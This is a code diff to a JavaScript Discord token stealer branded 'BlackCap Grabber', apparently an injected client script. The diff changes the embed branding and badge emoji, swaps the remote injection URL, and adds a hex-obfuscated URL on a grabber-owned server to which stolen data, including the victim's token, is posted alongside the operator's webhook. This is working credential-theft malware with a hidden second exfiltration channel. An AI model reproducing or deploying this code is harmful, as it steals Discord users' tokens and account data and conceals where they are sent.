@@ -15,8 +15,9 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/ytjhrttytj/hu43ygf5yhgiui3u5uyhiu4hvgwugtghuies/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     webhook: "%WEBHOOK%",
+    uwu: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -57,7 +58,7 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Mauricio Un-Detected Logger",
+        username: "BlackCap Grabber",
         avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
         content: "",
         embeds: [{
@@ -69,7 +70,7 @@ const makeEmbed = async ({
                 name: "BlackCap"
             },
             footer: {
-                text: ""
+                text: "©KSCH | https://github.com/KSCHdsc"
             },
 
         }]
@@ -111,11 +112,11 @@ const getGifOrPNG = async (url) => {
 
 const GetBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
 }
 const GetRBadges = (e) => {
     var n = "";
-    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
+    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
 }
 
 const GetNSFW = (bouki) => {
@@ -235,7 +236,7 @@ const post = async (params) => {
         data: params,
         token: token
     });
-    [config.webhook].forEach(res => {
+    [config.uwu, config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -250,6 +251,8 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
+        req.write(res == config.uwu ? n : params);
+        req.end();
     })
 
 }
